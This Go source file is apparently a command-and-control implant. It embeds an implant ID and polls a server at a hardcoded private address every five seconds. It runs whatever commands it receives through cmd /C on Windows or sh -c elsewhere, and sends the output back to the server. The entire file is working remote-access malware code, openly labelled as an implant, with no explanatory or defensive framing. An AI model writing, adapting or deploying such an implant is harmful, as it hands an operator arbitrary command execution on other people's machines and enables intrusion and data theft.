package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"runtime" // For OS specific commands
	"strings"
	"time"

	_ "embed"
)

//go:embed placeholder.txt
var implantIDBytes []byte // This should contain the 36-byte unique token

func implantID() string {
	return strings.TrimSpace(string(implantIDBytes)) // Trim any whitespace/newlines
}

const (
	// Update this URL to the new endpoint
	checkInURL       = "http://192.168.0.110:8080/checkin"
	commandsURL      = "http://192.168.0.110:8080/implant-client/%s/commands" // <-- UPDATED
	commandResultURL = "http://192.168.0.110:8080/command-result"
	checkInInterval  = 5 * time.Second
)

type Command struct {
	ID      int    `json:"id"`
	Command string `json:"command"`
	// We don't need Output or Status here, as we only care about executing
}

type CheckInPayload struct {
	ImplantID string `json:"implant_id"`
	IPAddress string `json:"ip_address"` // Optional, server can also use c.ClientIP()
}

type CommandResultPayload struct {
	CommandID int    `json:"command_id"`
	Output    string `json:"output"`
}

func main() {
	if implantID() == "" || implantID() == "deadbeef-0000-0000-0000-000000000000" {
		fmt.Println("Error: Implant ID not properly embedded or is placeholder.")
		// In a real scenario, might self-destruct or retry logic
		return
	}
	fmt.Printf("Implant Online. ID: %s\n", implantID())

	for {
		checkIn()
		fetchAndExecuteCommands()
		time.Sleep(checkInInterval)
	}
}

func checkIn() {
	payload := CheckInPayload{
		ImplantID: implantID(),
		IPAddress: "", // Server can try to determine this
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling check-in payload:", err)
		return
	}

	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error during check-in http.Post:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		// fmt.Println("Check-in successful") // Can be noisy
	} else {
		bodyBytes, _ := io.ReadAll(resp.Body)
		fmt.Printf("Check-in failed. Status: %s, Body: %s\n", resp.Status, string(bodyBytes))
	}
}

func fetchAndExecuteCommands() {
	url := fmt.Sprintf(commandsURL, implantID())
	// fmt.Println("Fetching commands from:", url) // Can be noisy

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error fetching commands http.Get:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body)
		fmt.Printf("Error fetching commands. Status: %s, Body: %s\n", resp.Status, string(bodyBytes))
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading command response body:", err)
		return
	}
	// fmt.Println("Raw Commands Response Body:", string(body)) // For debugging

	var respStruct struct {
		Commands []Command `json:"commands"`
	}
	if err := json.Unmarshal(body, &respStruct); err != nil {
		fmt.Println("Error decoding command response JSON:", err, "-- Body was:", string(body))
		return
	}

	if len(respStruct.Commands) > 0 {
		fmt.Printf("Received %d command(s) to execute.\n", len(respStruct.Commands))
	}

	for _, cmd := range respStruct.Commands {
		fmt.Printf("Executing Command ID %d: %s\n", cmd.ID, cmd.Command)
		var output []byte
		var execErr error

		if runtime.GOOS == "windows" {
			// For Windows, 'cmd /C' is often used. For PowerShell, 'powershell -Command ...'
			// Basic cmd /C execution:
			command := exec.Command("cmd", "/C", cmd.Command)
			output, execErr = command.CombinedOutput() // CombinedOutput gets both stdout and stderr
		} else {
			// For Linux/macOS, 'sh -c' or 'bash -c'
			command := exec.Command("sh", "-c", cmd.Command)
			output, execErr = command.CombinedOutput()
		}

		resultString := string(output)
		if execErr != nil {
			resultString += "\nExecution Error: " + execErr.Error()
			fmt.Printf("Error executing command ID %d: %v\nOutput: %s\n", cmd.ID, execErr, resultString)
		} else {
			// fmt.Printf("Command ID %d output: %s\n", cmd.ID, resultString) // Can be noisy
		}
		sendOutput(cmd.ID, resultString)
	}
}

func sendOutput(cmdID int, output string) {
	payload := CommandResultPayload{
		CommandID: cmdID,
		Output:    output,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling command result payload:", err)
		return
	}

	resp, err := http.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error sending output http.Post:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		// fmt.Printf("Command %d output sent successfully\n", cmdID) // Can be noisy
	} else {
		bodyBytes, _ := io.ReadAll(resp.Body)
		fmt.Printf("Failed to send output for command %d. Status: %s, Body: %s\n", cmdID, resp.Status, string(bodyBytes))
	}
}
